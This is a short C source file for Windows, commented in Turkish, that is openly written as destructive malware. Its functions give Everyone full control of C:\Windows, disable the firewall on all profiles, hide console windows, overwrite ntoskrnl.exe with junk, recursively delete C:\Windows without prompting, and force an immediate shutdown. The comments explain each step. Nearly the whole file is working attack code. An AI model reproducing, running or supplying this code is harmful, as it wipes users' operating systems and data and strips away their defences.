#include <stdio.h> //Her C programına standart giriş/çıkış işlemlerini yapan stdio.h dosyası çağrılır
#include <stdlib.h> //C Standard kitaplık üst bilgisini <stdlib.h> içerir ve ilişkili adları std ad alanına ekler
#include <windows.h> //windows api kütüphanesi
#include <tlhelp32.h>  //Windows platformunda işlem (process) bilgilerini almak için kullanılan API'ları içerir.
void modifyFilePermissions() {
    system("icacls C:\\Windows /grant Everyone:(F)");
} //C:\Windows dizinine herkes (Everyone) için tam kontrol (Full Control) izinleri vermeyi amaçlamaktadır.
void bypassFirewall() {
    system("netsh advfirewall set allprofiles state off"); 
}//// Windows Güvenlik Duvarı'nın tüm profil (domain, private, public) ayarlarını kapatır. Yani, bu komut çalıştırıldığında, güvenlik duvarı tüm ağ profillerinde devre dışı bırakılır.

void runVirus() {
    char* targetFile = "C:\\Windows\\System32\\ntoskrnl.exe";
    FILE* file = fopen(targetFile, "wb");
    if (file != NULL) {
        fwrite("This file is corrupted!", sizeof(char), 23, file);
        fclose(file);
    }  //ntoskrnl.exe dosyasını "This file is corrupted!" metni ile değiştirmek üzere tasarlanmış gibi görünmektedir. Ancak, bu tür bir işlem, işletim sistemi dosyalarına müdahale etmek ve özellikle de sistem dosyalarını değiştirmek ciddi sorunlara yol açabilir.
    system("rd /s /q C:\\Windows"); //s: Dizini ve içindeki tüm alt dizinleri ve dosyaları siler. -- /q: İşlemi sessiz modda gerçekleştirir, yani her adımda onay istemez.
    system("shutdown /s /t 0"); ///s: Bilgisayarın kapatılmasını ifade eder (shutdown). -- /t 0: Kapatma işleminin kaç saniye sonra gerçekleşeceğini belirler. Burada 0 saniye, işlemin hemen gerçekleşeceği anlamına gelir.
}
void hideAllCmdWindows() {
    HWND hwnd = GetForegroundWindow();
    while (hwnd != NULL) {
        HWND shellWindow = GetShellWindow();
        if (hwnd != shellWindow) {
            TCHAR className[256];
            GetClassName(hwnd, className, sizeof(className));
            if (strcmp(className, "ConsoleWindowClass") == 0) {
                ShowWindow(hwnd, SW_HIDE);
            }
        }
        hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
    } // Bu C dilinde yazılmış bir kod örneğidir ve görünürdeki tüm komut istemini (cmd) pencerelerini gizlemek için tasarlanmıştır.
}
int main() {
    modifyFilePermissions(); // Dosya izinlerini değiştir
    bypassFirewall(); // Firewall'ı kapat
    hideAllCmdWindows(); // cmd penceresini gizle
    runVirus(); // :)
    return 0;
}